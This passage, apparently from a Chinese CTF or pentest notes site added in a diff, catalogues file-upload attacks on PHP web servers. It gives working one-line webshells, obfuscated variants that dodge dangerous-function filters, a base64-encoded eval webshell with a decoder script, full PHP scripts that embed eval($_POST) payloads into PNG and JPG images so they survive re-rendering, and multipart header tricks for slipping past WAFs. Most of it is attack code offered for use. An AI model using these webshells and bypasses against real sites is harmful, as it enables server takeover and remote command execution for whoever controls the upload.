+<p>目录解析漏洞：上传到xxx.php这个目录下的文件就会被解析，可以利用%00截断创建文件夹，然后上传到该目录下</p>
+<ol>
+<li>利用系统特性</li>
+</ol>
+<p>windows+php+iis中，上传<code>shell.php:.jpg</code>会创建一个空的shell.php，然后上传<code>shell.&lt;&lt;&lt;</code>的文件就可以把上传的内容写入文件了</p>
+<h3 id="_4">文件头检测<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>上传图片马，在修改后缀为可解析脚本语言；</p>
+<p>cmd命令<code>copy 1.png/b+2.php/a 3.png</code>制作图片马</p>
+<p>或者上传一句话木马在文件中添加正常格式文件头例如：<code>GIF89a</code>、png文件头<code>89504E47</code>、jpg文件头<code>FFD8FF</code></p>
+<h3 id="_5">危险函数检测<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ol>
+<li>使用动态调用绕过</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">](</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">此方法不能绕过disable_function</span>
+</code></pre></div>
+<p>进阶一点的脚本：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
+    <span class="nv">$poc</span><span class="o">=</span><span class="s2">&quot;s#y#s#t#e#m&quot;</span><span class="p">;</span> 
+    <span class="nv">$poc_1</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;#&quot;</span><span class="p">,</span><span class="nv">$poc</span><span class="p">);</span> 
+    <span class="nv">$poc_2</span><span class="o">=</span><span class="nv">$poc_1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nv">$poc_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nv">$poc_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="nv">$poc_1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="nv">$poc_1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="nv">$poc_1</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+    <span class="nv">$poc_2</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>然后GET传参<code>1=cat /flag</code>即可</p>
+<ol>
+<li>上传编码后的webshell配合<code>.htaccess</code>来解析</li>
+<li>上传编码后的webshell，再另外上传一个脚本文件解码webshell并写入新文件</li>
+</ol>
+<p>例如下面这段代码为1.php</p>
+<div class="highlight"><pre><span></span><code><span class="x">PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=</span>
+</code></pre></div>
+<p>上传后再上传下面为2.php</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
+
+<span class="nv">$path</span> <span class="o">=</span><span class="s2">&quot;/xx/xxx/xx/1.php&quot;</span><span class="p">;</span>
+
+<span class="nv">$str</span><span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+
+<span class="nv">$strs</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+
+<span class="nv">$test</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;./test.php&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
+
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span><span class="nv">$strs</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>然后访问后再访问test.php即可getshell</p>
+<h3 id="_6">二次渲染<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>上传的图片再下载发现里面的一句话没了，需要使用下面的脚本生成图片马</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="cm">/*&lt;?$_GET[0]($_POST[1]);?&gt;*/</span>
+
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
+    <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
+    <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
+    <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
+    <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
+    <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
+    <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
+    <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
+
+
+
+<span class="nv">$img</span> <span class="o">=</span> <span class="nb">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nb">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
+    <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+    <span class="nv">$color</span> <span class="o">=</span> <span class="nb">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
+    <span class="nb">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nb">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;1.png&#39;</span><span class="p">);</span>
+</code></pre></div>
+<p>需要安装php的gd库，使用命令<code>sudo apt-get install php-gd</code>进行安装，然后运行<code>php 图片二次渲染.php</code>，生成<code>1.png</code></p>
+<p>jpg的二次渲染脚本如下：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$miniPayload</span> <span class="o">=</span> <span class="s1">&#39;&lt;?=eval($_POST[1]);?&gt;&#39;</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nb">set_error_handler</span><span class="p">(</span><span class="s2">&quot;custom_error_handler&quot;</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="nv">$pad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$pad</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="nv">$pad</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$nullbytePayloadSize</span> <span class="o">=</span> <span class="nv">$pad</span><span class="p">;</span>
+        <span class="nv">$dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataInputStream</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="nv">$outStream</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">!=</span> <span class="mh">0xFFD8</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">==</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$marker</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">();</span>
+            <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">skip</span><span class="p">(</span><span class="nv">$size</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$marker</span> <span class="o">===</span> <span class="mh">0xDA</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$startPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
+                <span class="nv">$outStreamTmp</span> <span class="o">=</span> 
+                    <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
+                    <span class="nv">$miniPayload</span> <span class="o">.</span> 
+                    <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span> <span class="o">.</span> 
+                    <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">);</span>
+                <span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStreamTmp</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$extraBytes</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()))</span> <span class="p">{</span>
+                        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">===</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span> <span class="o">!==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
+                                <span class="k">break</span><span class="p">;</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                    <span class="nv">$stopPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+                    <span class="nv">$imageStreamSize</span> <span class="o">=</span> <span class="nv">$stopPos</span> <span class="o">-</span> <span class="nv">$startPos</span><span class="p">;</span>
+                    <span class="nv">$outStream</span> <span class="o">=</span> 
+                        <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
+                        <span class="nv">$miniPayload</span> <span class="o">.</span> 
+                        <span class="nb">substr</span><span class="p">(</span>
+                            <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
+                                <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">,</span> <span class="nv">$imageStreamSize</span><span class="p">),</span>
+                            <span class="mi">0</span><span class="p">,</span>
+                            <span class="nv">$nullbytePayloadSize</span><span class="o">+</span><span class="nv">$imageStreamSize</span><span class="o">-</span><span class="nv">$extraBytes</span><span class="p">)</span> <span class="o">.</span> 
+                                <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$stopPos</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$correctImage</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$outStream</span> <span class="o">=</span> <span class="nv">$outStreamTmp</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStream</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nb">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Something\&#39;s wrong&#39;</span><span class="p">);</span>
+
+    <span class="k">function</span> <span class="nf">checkImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$unlink</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">global</span> <span class="nv">$correctImage</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
+        <span class="nb">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$unlink</span><span class="p">)</span>
+            <span class="nb">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$correctImage</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">custom_error_handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">global</span> <span class="nv">$extraBytes</span><span class="p">,</span> <span class="nv">$correctImage</span><span class="p">;</span>
+        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+                <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">class</span> <span class="nc">DataInputStream</span> <span class="p">{</span>
+        <span class="k">private</span> <span class="nv">$binData</span><span class="p">;</span>
+        <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
+        <span class="k">private</span> <span class="nv">$size</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$fromString</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span> <span class="o">=</span> <span class="nv">$order</span><span class="p">;</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fromString</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">-</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">skip</span><span class="p">(</span><span class="nv">$skip</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="nv">$skip</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">readByte</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$byte</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$byte</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">readShort</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$short</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="nv">$short</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">eof</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="o">||</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>不过jpg图片成功率很低，可以尝试直接使用下面的原图</p>
+<p><img alt="image-20221117232650675" src="165-1.jpg" /></p>
+<p>运行脚本<code>php jpg图片二次渲染.php 1.jpg</code>，生成payload_1.jpg</p>
+<p>然后再上传payload_1.jpg，POST传参就可以命令执行了</p>
+<h2 id="waf">WAF层面<a class="headerlink" href="#waf" title="Permanent link">&para;</a></h2>
+<p>只要能绕过WAF，并且传到后端还能执行，不会500就行</p>
+<p>代码层面的绕过依旧有效</p>
+<h3 id="_7">换行绕过<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.p</span>
+<span class="x">hp&quot;</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file&quot;; file</span>
+<span class="x">name=&quot;1.php&quot;</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file&quot;; filename=</span>
+<span class="x">&quot;1.php&quot;</span>
+<span class="x">#三种均可</span>
+</code></pre></div>
+<h3 id="_8">多个等号绕过<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Disposition: form-data; name=&quot;file&quot;; filename===&quot;a.php&quot;</span>
+</code></pre></div>
+<h3 id="_9">增大文件大小<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=&quot;file&quot;; filename=&quot;a.php&quot;</span>
+</code></pre></div>
+<h3 id="_10">去掉或替换引号<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Disposition: form-data; name=file1; filename=a.php</span>
+<span class="x">Content-Disposition: form-data; name=&#39;file1&#39;; filename=&quot;a.php&quot;</span>
+</code></pre></div>
+<h3 id="filename">增加filename干扰<a class="headerlink" href="#filename" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Disposition: form-data; name=&quot;file&quot;; filename= ;  filename=&quot;a.php&quot;</span>
+</code></pre></div>
+<h3 id="waf_1">混淆waf匹配字段<a class="headerlink" href="#waf_1" title="Permanent link">&para;</a></h3>
+<ol>
+<li>混淆form-data</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Disposition: name=&quot;file&quot;; filename=&quot;a.php&quot;</span>
+<span class="x">去除form-data</span>
+
+<span class="x">Content-Disposition: AAAAAAAA=&quot;BBBBBBBB&quot;; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span>
+<span class="x">替换form-data为垃圾值</span>
+
+<span class="x">Content-Disposition: form-data   ; name=&quot;file&quot;; filename=&quot;a.php&quot;</span>
+<span class="x">form-data后加空格</span>
+
+<span class="x">Content-Disposition: for+m-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span>
+<span class="x">form-data中加+</span>
+</code></pre></div>
+<ol>
+<li>混淆ConTent-Disposition</li>
+</ol>
